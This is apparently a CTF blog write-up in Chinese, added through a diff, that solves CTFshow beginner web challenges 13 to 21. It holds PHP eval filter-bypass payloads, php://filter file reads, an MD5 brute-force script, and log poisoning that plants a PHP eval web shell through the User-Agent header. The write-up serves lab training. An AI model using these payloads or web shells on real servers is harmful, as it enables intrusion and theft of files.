@@ -1,0 +1,275 @@
+<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="format-detection" content="telephone=no"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><link rel="icon" href="/images/icons/favicon-16x16.png?v=2.6.2" type="image/png" sizes="16x16"><link rel="icon" href="/images/icons/favicon-32x32.png?v=2.6.2" type="image/png" sizes="32x32"><meta name="description" content="CTFshow &amp;#x840C;&amp;#x65B0;&amp;#x8BA1;&amp;#x5212;                           web13       sql&amp;#x6CE8;&amp;#x5165;&amp;#x4E0D;&amp;#x60F3;&amp;#x5B66;&amp;#x4E86;&amp;#xFF0C;&amp;#x5B66;&amp;#x4E86;&amp;#x5FD8;&amp;#xFF0C;&amp;#x5FD8;&amp;#x4E86;&amp;#x">
+<meta property="og:type" content="article">
+<meta property="og:title" content="4.9wp">
+<meta property="og:url" content="http://example.com/2022/04/08/4-9wp/index.html">
+<meta property="og:site_name" content="Clutter Box">
+<meta property="og:description" content="CTFshow &amp;#x840C;&amp;#x65B0;&amp;#x8BA1;&amp;#x5212;                           web13       sql&amp;#x6CE8;&amp;#x5165;&amp;#x4E0D;&amp;#x60F3;&amp;#x5B66;&amp;#x4E86;&amp;#xFF0C;&amp;#x5B66;&amp;#x4E86;&amp;#x5FD8;&amp;#xFF0C;&amp;#x5FD8;&amp;#x4E86;&amp;#x">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/2022/04/08/4-9wp/4-9wp/image-20220408234732830.png">
+<meta property="og:image" content="http://example.com/2022/04/08/4-9wp/image-20220408235651326.png">
+<meta property="og:image" content="http://example.com/2022/04/08/4-9wp/4-9wp/image-20220410005002776.png">
+<meta property="og:image" content="http://example.com/2022/04/08/4-9wp/image-20220410130435921.png">
+<meta property="og:image" content="http://example.com/2022/04/08/4-9wp/image-20220410140512533.png">
+<meta property="og:image" content="http://example.com/2022/04/08/4-9wp/image-20220410141119378.png">
+<meta property="og:image" content="http://example.com/2022/04/08/4-9wp/image-20220410144333564.png">
+<meta property="og:image" content="http://example.com/2022/04/08/4-9wp/image-20220410150906213.png">
+<meta property="og:image" content="http://example.com/2022/04/08/4-9wp/image-20220410120126345.png">
+<meta property="og:image" content="http://example.com/2022/04/08/4-9wp/image-20220410121340751.png">
+<meta property="og:image" content="http://example.com/2022/04/08/4-9wp/image-20220410121409895.png">
+<meta property="og:image" content="http://example.com/2022/04/08/4-9wp/image-20220410121721273.png">
+<meta property="og:image" content="http://example.com/2022/04/08/4-9wp/image-20220410121859298.png">
+<meta property="article:published_time" content="2022-04-08T15:46:06.000Z">
+<meta property="article:modified_time" content="2022-07-15T02:34:31.466Z">
+<meta property="article:author" content="Kirsten Carton">
+<meta property="article:tag" content="sql">
+<meta property="article:tag" content="ctfhub">
+<meta property="article:tag" content="ctfshow">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2022/04/08/4-9wp/4-9wp/image-20220408234732830.png"><title>4.9wp | Clutter Box</title><link ref="canonical" href="http://example.com/2022/04/08/4-9wp/"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.12.1/css/all.min.css" type="text/css"><link rel="stylesheet" href="/css/index.css?v=2.6.2"><script>var Stun = window.Stun || {};
+var CONFIG = {
+  root: '/',
+  algolia: undefined,
+  assistSearch: undefined,
+  fontIcon: {"prompt":{"success":"fas fa-check-circle","info":"fas fa-arrow-circle-right","warning":"fas fa-exclamation-circle","error":"fas fa-times-circle"},"copyBtn":"fas fa-copy"},
+  sidebar: {"offsetTop":"20px","tocMaxDepth":6},
+  header: {"enable":true,"showOnPost":true,"scrollDownIcon":false},
+  postWidget: {"endText":true},
+  nightMode: {"enable":true},
+  back2top: {"enable":true},
+  codeblock: {"style":"default","highlight":"light","wordWrap":false},
+  reward: false,
+  fancybox: false,
+  zoomImage: {"gapAside":"20px"},
+  galleryWaterfall: undefined,
+  lazyload: false,
+  pjax: undefined,
+  externalLink: {"icon":{"enable":true,"name":"fas fa-external-link-alt"}},
+  shortcuts: undefined,
+  prompt: {"copyButton":"Copy","copySuccess":"Copy Success","copyError":"Copy Error"},
+  sourcePath: {"js":"js","css":"css","images":"images"},
+};
+
+window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 6.0.0"></head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner"><nav class="header-nav header-nav--fixed"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">Home</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/archives/"><span class="header-nav-menu-item__icon"><i class="fas fa-folder-open"></i></span><span class="header-nav-menu-item__text">Archives</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/categories/"><span class="header-nav-menu-item__icon"><i class="fas fa-layer-group"></i></span><span class="header-nav-menu-item__text">Categories</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/tags/"><span class="header-nav-menu-item__icon"><i class="fas fa-tags"></i></span><span class="header-nav-menu-item__text">Tags</span></a></div></div><div class="header-nav-mode"><div class="mode"><div class="mode-track"><span class="mode-track-moon"></span><span class="mode-track-sun"></span></div><div class="mode-thumb"></div></div></div></div></nav><div class="header-banner"><div class="header-banner-info"><div class="header-banner-info__title">Clutter Box</div><div class="header-banner-info__subtitle"></div></div></div></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content" id="content"><!-- Just used to judge whether it is an article page--><div id="is-post"></div><div class="post"><header class="post-header"><h1 class="post-title">4.9wp</h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2022-04-08</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2022-07-15</span></span></div></header><div class="post-body">
+        <h1 id="CTFshow-&#x840C;&#x65B0;&#x8BA1;&#x5212;">
+          <a href="#CTFshow-&#x840C;&#x65B0;&#x8BA1;&#x5212;" class="heading-link"><i class="undefined"></i></a><a href="#CTFshow-&#x840C;&#x65B0;&#x8BA1;&#x5212;" class="headerlink" title="CTFshow &#x840C;&#x65B0;&#x8BA1;&#x5212;"></a>CTFshow &#x840C;&#x65B0;&#x8BA1;&#x5212;</h1>
+      
+        <h2 id="web13">
+          <a href="#web13" class="heading-link"><i class="undefined"></i></a><a href="#web13" class="headerlink" title="web13"></a>web13</h2>
+      <p><font color="white">sql&#x6CE8;&#x5165;&#x4E0D;&#x60F3;&#x5B66;&#x4E86;&#xFF0C;&#x5B66;&#x4E86;&#x5FD8;&#xFF0C;&#x5FD8;&#x4E86;&#x5B66;&#xFF0C;&#x4E0D;&#x5982;&#x54EA;&#x5929;&#xFF08;&#x6307;&#x5927;&#x6982;&#x6CA1;&#x6709;&#x8FD9;&#x4E00;&#x5929;&#xFF09;&#x7CFB;&#x7EDF;&#x7684;&#x5B66;&#x4E60;&#x8FD9;&#x4E9B;&#x6307;&#x4EE4;</font></p>
+<span id="more"></span>
+
+<p><img src="/2022/04/08/4-9wp/4-9wp/image-20220408234732830.png" alt="image-20220408234732830"></p>
+<p>&#x8FC7;&#x6EE4;&#x4E86;<code>.</code>      <code>;</code></p>
+<p>&#x4E24;&#x79CD;&#x7ED5;&#x8FC7;&#x65B9;&#x5F0F;&#xFF1A;(&#x597D;&#x50CF;&#x76EE;&#x524D;&#x7528;&#x5230;&#x7684;&#x90FD;&#x662F;get&#x4F20;&#x53C2;)</p>
+<ol>
+<li></li>
+</ol>
+<ul>
+<li>&#x5148;&#x4F7F;&#x7528;<code>c=passthru(&apos;ls&apos;)?&gt;</code>,&#x6B64;&#x5904;&#x662F;&#x7528;<code>?&gt;</code>&#x6765;&#x4EE3;&#x66FF;<code>;</code> &#x67E5;&#x770B;&#x5F53;&#x524D;&#x76EE;&#x5F55;&#x4E0B;&#x7684;&#x6587;&#x4EF6;</li>
+</ul>
+<img src="/2022/04/08/4-9wp/image-20220408235651326.png" alt="image-20220408235651326" style="zoom:50%;">
+
+<ul>
+<li><p>&#x987B;&#x77E5;&#xFF1A;Linux&#x91CC;&#x9762;&#x5148;&#x6267;&#x884C;&#x53CD;&#x5F15;&#x53F7;&#x91CC;&#x9762;&#x7684;&#x5185;&#x5BB9;``</p>
+</li>
+<li><p>~~~<br>?c=passthru(&#x201C;more<code>ls | grep con*</code>&#x201C;)?&gt;</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  &#x4E4B;&#x540E;&#x67E5;&#x770B;&#x6E90;&#x4EE3;&#x7801;&#x5373;&#x53EF;</span><br><span class="line"></span><br><span class="line">2.</span><br><span class="line"></span><br><span class="line">- &#x540C;&#x6837;&#x662F;&#x4F7F;&#x7528;`passthru=`&#x6765;&#x7ED5;&#x8FC7;&#xFF0C;&#x4E0D;&#x8FC7;&#x8FD9;&#x6B21;&#x4F20;&#x5165;&#x7684;config&#x662F;&#x7528;base64&#x7ED5;&#x8FC7;, &#x7F16;&#x7801;&#x7684;&#x662F;`cat config.php`</span><br><span class="line"></span><br></pre></td></tr></table></div></figure>
+<p>?c=passthru(base64_decode(&#x201C;Y2F0IGNvbmZpZy5waHA=&#x201D;))?&gt;</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  &#x4E4B;&#x540E;&#x67E5;&#x770B;&#x6E90;&#x4EE3;&#x7801;&#x5373;&#x53EF;</span><br><span class="line"></span><br><span class="line">## web14</span><br><span class="line"></span><br><span class="line">~~~php</span><br><span class="line">&lt;?php</span><br><span class="line"># flag in config.php</span><br><span class="line">include(&quot;config.php&quot;);</span><br><span class="line">if(isset($_GET[&apos;c&apos;])){</span><br><span class="line">        $c = $_GET[&apos;c&apos;];</span><br><span class="line">        if(!preg_match(&quot;/system|exec|highlight|cat|\(|\.|\;|file|php|config/i&quot;,$c)){</span><br><span class="line">                eval($c);</span><br><span class="line">        }else{</span><br><span class="line">            die(&quot;cmd error&quot;);</span><br><span class="line">        }</span><br><span class="line">}else{</span><br><span class="line">        highlight_file(__FILE__);</span><br><span class="line">}</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></div></figure></li>
+</ul>
+<p>&#x8FC7;&#x6EE4;&#x4E86;&#x62EC;&#x53F7;<code>(</code>     &#x672C;&#x9898;&#x8003;&#x70B9;&#x8FD8;&#x662F;PHP&#x4F2A;&#x534F;&#x8BAE;</p>
+<p>&#x5229;&#x7528;&#x7684;&#x662F;&#x201C;include&#x5305;&#x542B;&#x7ED3;&#x5408;PHP&#x4F2A;&#x534F;&#x8BAE;&#x201D;</p>
+<ul>
+<li>&#x5148;&#x7528;include&#x5305;&#x542B;&#x4E00;&#x4E2A;get&#x4F20;&#x53C2;&#xFF0C;&#x53C2;&#x6570;&#x662F;a,&#x7136;&#x540E;&#x5BF9;a&#x8D4B;&#x503C;&#xFF0C;&#x503C;&#x7684;&#x5185;&#x5BB9;&#x5C31;&#x662F;&#x5C06;&#x6587;&#x4EF6;&#x8F6C;&#x7801;&#x6210;base64&#x7136;&#x540E;&#x8BFB;&#x53D6;</li>
+</ul>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=include$GET_[&apos;a&apos;]?&gt;&amp;a=php://filter/read=convert.base64-encode/resource=config.php</span><br></pre></td></tr></table></div></figure>
+
+<p>&#x8FD4;&#x56DE;&#x7684;&#x5C31;&#x662F;base64&#xFF0C;&#x89E3;&#x7801;&#x5F97;&#x5230;flag</p>
+
+        <h2 id="web15">
+          <a href="#web15" class="heading-link"><i class="undefined"></i></a><a href="#web15" class="headerlink" title="web15"></a>web15</h2>
+      <figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment"># flag in config.php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;config.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&apos;c&apos;</span>])){</span><br><span class="line">        <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&apos;c&apos;</span>];</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/system|\\*|\?|\&lt;|\&gt;|\=|exec|highlight|cat|\(|\.|file|php|config/i&quot;</span>,<span class="variable">$c</span>)){</span><br><span class="line">                <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">        }<span class="keyword">else</span>{</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;cmd error&quot;</span>);</span><br><span class="line">        }</span><br><span class="line">}<span class="keyword">else</span>{</span><br><span class="line">        <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">}</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></div></figure>
+
+<p>payload&#x540C;&#x4E0A;&#x9898;</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=include$_GET[&apos;a&apos;];&amp;a=php://filter/read=convert.base64-encode/resource=config.php</span><br></pre></td></tr></table></div></figure>
+
+<p>&#x6B64;&#x5904;&#x6CA1;&#x6709;&#x8FC7;&#x6EE4;<code>;</code>&#x4F46;&#x662F;&#x4E3A;&#x4EC0;&#x4E48;&#x7528;<code>?&gt;</code>&#x5C31;&#x4E0D;&#x80FD;&#x6B63;&#x5E38;&#x8FD4;&#x56DE;&#x7ED3;&#x679C;&#x5462;</p>
+<p>&#x6216;&#x8005;</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=echo`$_REQUEST[a]`;&amp;a=cat config.php</span><br></pre></td></tr></table></div></figure>
+
+
+        <h2 id="web-16">
+          <a href="#web-16" class="heading-link"><i class="undefined"></i></a><a href="#web-16" class="headerlink" title="web 16"></a>web 16</h2>
+      <figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment"># flag in config.php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;config.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&apos;c&apos;</span>])){</span><br><span class="line">        <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&apos;c&apos;</span>];</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="string">&quot;ctfshow<span class="subst">$c</span>&quot;</span>)===<span class="string">&quot;a6f57ae38a22448c2f07f3f95f49c84e&quot;</span>){</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        }<span class="keyword">else</span>{</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;nonono!&quot;</span>;</span><br><span class="line">        }</span><br><span class="line">}<span class="keyword">else</span>{</span><br><span class="line">        <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">}</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></div></figure>
+
+<p>&#x4E09;&#x4E2A;&#x7B49;&#x53F7;&#x4E0D;&#x4EC5;&#x503C;&#x8981;&#x76F8;&#x7B49;&#xFF0C;&#x7C7B;&#x578B;&#x4E5F;&#x76F8;&#x7B49;</p>
+<p>&#x6284;&#x7684;&#x811A;&#x672C;&#xFF0C;&#x55EF;&#xFF0C;&#x5FD8;&#x4E86;&#x4E3A;&#x751A;&#x4E48;&#x8981;&#x5957;&#x4E09;&#x4E2A;&#x5FAA;&#x73AF;</p>
+<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="comment">#&#x5EFA;&#x7ACB;&#x7206;&#x7834;&#x7684;&#x5B57;&#x5178;str</span></span><br><span class="line"><span class="built_in">str</span>=<span class="string">&apos;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890+-*/&apos;</span></span><br><span class="line"><span class="comment">#&#x4ECE;&#x4E00;&#x4E2A;&#x5B57;&#x7B26;&#x5F00;&#x59CB;&#x5C1D;&#x8BD5;&#xFF0C;&#x9010;&#x6E10;&#x5F80;&#x4E0B;&#x52A0;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">str</span> :</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">str</span>:</span><br><span class="line">            s=hashlib.md5((<span class="string">&apos;ctfshow&apos;</span>+i+j+k).encode()).hexdigest()</span><br><span class="line">            <span class="comment">#&#x8BA9;ctfshow&#x548C;&#x5B57;&#x7B26;i,j,k&#x62FC;&#x63A5;&#x5728;&#x4E00;&#x8D77;&#xFF0C;&#x8F6C;&#x5316;&#x4E3A;MD5&#x503C;&#xFF0C;hexdigest&#x51FD;&#x6570;&#x5B9E;&#x73B0;&#x5B57;&#x7B26;&#x5B58;&#x50A8;</span></span><br><span class="line">            <span class="keyword">if</span> s== <span class="string">&apos;a6f57ae38a22448c2f07f3f95f49c84e&apos;</span>:<span class="comment">#&#x5224;&#x65AD;&#x503C;&#x662F;&#x5426;&#x7B26;&#x5408;&#x6761;&#x4EF6;</span></span><br><span class="line">                <span class="built_in">print</span>(i+j+k)<span class="comment">#&#x8F93;&#x51FA;&#x5B57;&#x7B26;c&#x7684;&#x503C;</span></span><br></pre></td></tr></table></div></figure>
+
+<p>&#x8DD1;&#x51FA;&#x6765;&#x7ED3;&#x679C;&#x662F;36d</p>
+<p>&#x4E32;&#x53C2;<code>?c=36d</code>&#x5F97;flag</p>
+<hr>
+<p><img src="/2022/04/08/4-9wp/4-9wp/image-20220410005002776.png" alt="image-20220410005002776"></p>
+
+        <h2 id="web-17">
+          <a href="#web-17" class="heading-link"><i class="undefined"></i></a><a href="#web-17" class="headerlink" title="web 17"></a>web 17</h2>
+      <p>&#x8003;&#x5BDF; <strong>&#x65E5;&#x5FD7;&#x6587;&#x4EF6;&#x5305;&#x542B;</strong>&#xFF1B;&#x672C;&#x9898;&#x9700;&#x8981;&#x4FEE;&#x6539;UA&#x5199;&#x4E00;&#x53E5;&#x8BDD;&#x6728;&#x9A6C;</p>
+<p>&#x5148;&#x6293;&#x5305;,&#x53D1;&#x9001;&#x5230;repeater&#xFF0C;&#x518D;send&#xFF0C;&#x53EF;&#x4EE5;&#x770B;&#x5230;</p>
+<img src="/2022/04/08/4-9wp/image-20220410130435921.png" alt="image-20220410130435921" style="zoom:33%;">
+
+<p>&#x5F97;&#x77E5;&#x670D;&#x52A1;&#x5668;&#x7528;&#x7684;&#x5C31;&#x662F;Nginx</p>
+<ol>
+<li>&#x522B;&#x4EBA;wp&#x8BF4;   <strong>nginx&#x9ED8;&#x8BA4;&#x65E5;&#x5FD7;&#x4F4D;&#x7F6E;&#xFF1A;/var/log/nginx/access.log</strong></li>
+</ol>
+<p>&#x4E5F;&#x53EF;&#x4EE5;&#x7528;get&#x4F20;&#x53C2;<code>?c=/var/log/nginx/access.log</code></p>
+<img src="/2022/04/08/4-9wp/image-20220410140512533.png" alt="image-20220410140512533" style="zoom:33%;">
+
+<p>&#x6210;&#x529F;&#x8BFB;&#x53D6;&#x65E5;&#x5FD7;</p>
+<ol start="2">
+<li>&#x518D;&#x6293;&#x5305;&#xFF0C;&#x8F93;&#x5165;&#x4E00;&#x53E5;&#x8BDD;&#x6728;&#x9A6C;</li>
+</ol>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php highlight_file(&apos;36d.php&apos;);?&gt;</span><br><span class="line">&lt;?php eval($_POST[&apos;hack&apos;];)?&gt;</span><br><span class="line">&lt;?php eval($POST_[pass]);?&gt;</span><br><span class="line">&lt;?php eval($_POST[&apos;a&apos;]);?&gt;</span><br><span class="line">//&#x8FD9;&#x4E9B;&#x90FD;&#x662F;&#x7F51;&#x4E0A;&#x7684;wp&#x5199;&#x7684;&#xFF0C;&#x5DEE;&#x4E0D;&#x591A;</span><br></pre></td></tr></table></div></figure>
+
+<img src="/2022/04/08/4-9wp/image-20220410141119378.png" alt="image-20220410141119378" style="zoom:67%;">
+
+<ol start="3">
+<li>&#x4E4B;&#x540E;&#x7528;&#x8681;&#x5251;&#x8FDE;&#x63A5;</li>
+</ol>
+<p>&#x627E;&#x5230;36.php,&#x6253;&#x5F00;&#x5C31;&#x662F;flag</p>
+<p><strong>&#x603B;&#x7ED3;&#xFF1A;&#x5148;&#x6293;&#x5305;&#xFF0C;&#x5F97;&#x77E5;&#x670D;&#x52A1;&#x5668;&#xFF0C;&#x5F97;&#x77E5;&#x65E5;&#x5FD7;&#x6587;&#x4EF6;&#x5B58;&#x653E;&#x4F4D;&#x7F6E;&#xFF0C;&#x5728;UA&#x91CC;&#x9762;&#x6CE8;&#x5165;&#x4E00;&#x53E5;&#x8BDD;&#x6728;&#x9A6C;&#xFF08;post&#x4F20;&#x53C2;&#xFF09;&#xFF0C;&#x7528;&#x8681;&#x5251;&#x8FDE;&#x63A5;&#xFF0C;&#x5F97;&#x5230;&#x6587;&#x4EF6;&#xFF0C;&#x5F97;flag</strong></p>
+<hr>
+<p>&#x539F;&#x7406;<br>&#x9996;&#x5148;&#x9700;&#x8981;&#x5F00;&#x542F;&#x670D;&#x52A1;&#x5668;&#x8BB0;&#x5F55;&#x65E5;&#x5FD7;&#x529F;&#x80FD;</p>
+<p>&#x5728;&#x4E0D;&#x540C;&#x7684;&#x7CFB;&#x7EDF;&#xFF0C;&#x5B58;&#x653E;&#x65E5;&#x5FD7;&#x6587;&#x4EF6;&#x5730;&#x65B9;&#x548C;&#x6587;&#x4EF6;&#x540D;&#x4E0D;&#x540C;<br><strong>apache&#x4E00;&#x822C;&#x662F;/var/log/apache/access.log</strong></p>
+<p><strong>nginx&#x7684;log&#x5728;/var/log/nginx/access.log&#x548C;/var/log/nginx/error.log</strong></p>
+<p>&#x7531;&#x4E8E;&#x8BBF;&#x95EE;URL&#x65F6;&#x8BBF;&#x95EE;URL&#x65F6;&#xFF0C;&#x670D;&#x52A1;&#x5668;&#x4F1A;&#x5BF9;&#x5176;&#x7F16;&#x7801;&#xFF0C;&#x6240;&#x4EE5;&#x5F97;&#x901A;&#x8FC7;&#x6293;&#x5305;&#x7684;&#x5F62;&#x5F0F;&#x5C1D;&#x8BD5;&#x6CE8;&#x5165;<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_51553814/article/details/121109276">https://blog.csdn.net/qq_51553814/article/details/121109276</a></p>
+<hr>
+
+        <h2 id="web18">
+          <a href="#web18" class="heading-link"><i class="undefined"></i></a><a href="#web18" class="headerlink" title="web18"></a>web18</h2>
+      <ul>
+<li>&#x540C;web17&#xFF0C;&#x4F46;&#x662F;&#x6709;&#x4E2A;&#x95EE;&#x9898;&#xFF0C;&#x5982;&#x679C;&#x64CD;&#x4F5C;&#x4E0D;&#x53CA;&#x65F6;&#x5C31;&#x65E0;&#x6CD5;&#x8BFB;&#x53D6;&#x65E5;&#x5FD7;&#x6587;&#x4EF6;&#xFF0C;&#x4F1A;&#x663E;&#x793A;&#x62A5;&#x9519;</li>
+<li><img src="/2022/04/08/4-9wp/image-20220410144333564.png" alt="image-20220410144333564" style="zoom:33%;"></li>
+</ul>
+<p>&#xFF08;&#x5C31;&#x662F;&#x8FD9;&#x4E2A;&#xFF09;</p>
+<hr>
+<p>(&#x611F;&#x8C22;&#x7F51;&#x7EDC;)</p>
+<img src="/2022/04/08/4-9wp/image-20220410150906213.png" alt="image-20220410150906213" style="zoom:33%;">
+
+<p>&#x539F;&#x6765;&#x5982;&#x6B64;</p>
+<ul>
+<li>&#x540C;&#x65F6;&#x8FD8;&#x77E5;&#x9053;&#x4E86;&#x8681;&#x5251;&#x5982;&#x679C;&#x62A5;&#x9519;<code>{}</code>&#x662F;&#x8BF4;&#x660E;&#x5BC6;&#x7801;&#x586B;&#x9519;&#x4E86;</li>
+<li>&#x4E00;&#x822C;&#x8681;&#x5251;&#x662F;&#x4E0D;&#x7528;&#x4EE3;&#x7406;&#x7684;&#xFF0C;&#x4E5F;&#x8BB8;</li>
+</ul>
+
+        <h2 id="web19-web21">
+          <a href="#web19-web21" class="heading-link"><i class="undefined"></i></a><a href="#web19-web21" class="headerlink" title="web19~web21"></a>web19~web21</h2>
+      <p>&#x540C;17,18</p>
+<hr>
+<p>&#x8FD9;&#x91CC;&#x8FD8;&#x6709;&#x4E00;&#x79CD;payload&#x5C31;&#x662F;&#x5728;ua&#x6CE8;&#x5165;&#x65F6;&#x4F7F;&#x7528;(&#x4E4B;&#x524D;&#x5148;&#x8BFB;&#x53D6;&#x65E5;&#x5FD7;&#x6587;&#x4EF6;&#xFF0C;&#x518D;&#x6293;&#x5305;)</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x5148;&lt;?php system(&apos;ls&apos;)?&gt;; //&#x67E5;&#x770B;&#x5F53;&#x524D;&#x8DEF;&#x5F84;&#x4E0B;&#x7684;&#x6587;&#x4EF6;</span><br><span class="line">&#x4F1A;&#x56DE;&#x663E;36.php</span><br><span class="line">&#x540E;&#x5728;ua&#x7528;&lt;?php highlight_file(&apos;36d.php&apos;):?&gt; //&#x9AD8;&#x4EAE;36.php&#x6587;&#x4EF6;&#x91CC;&#x7684;&#x5185;&#x5BB9;</span><br></pre></td></tr></table></div></figure>
+
+
+        <h2 id="&#x83B7;&#x5F97;&#x767E;&#x5206;&#x4E4B;&#x767E;&#x7684;&#x5FEB;&#x4E50;">
+          <a href="#&#x83B7;&#x5F97;&#x767E;&#x5206;&#x4E4B;&#x767E;&#x7684;&#x5FEB;&#x4E50;" class="heading-link"><i class="undefined"></i></a><a href="#&#x83B7;&#x5F97;&#x767E;&#x5206;&#x4E4B;&#x767E;&#x7684;&#x5FEB;&#x4E50;" class="headerlink" title="&#x83B7;&#x5F97;&#x767E;&#x5206;&#x4E4B;&#x767E;&#x7684;&#x5FEB;&#x4E50;"></a>&#x83B7;&#x5F97;&#x767E;&#x5206;&#x4E4B;&#x767E;&#x7684;&#x5FEB;&#x4E50;</h2>
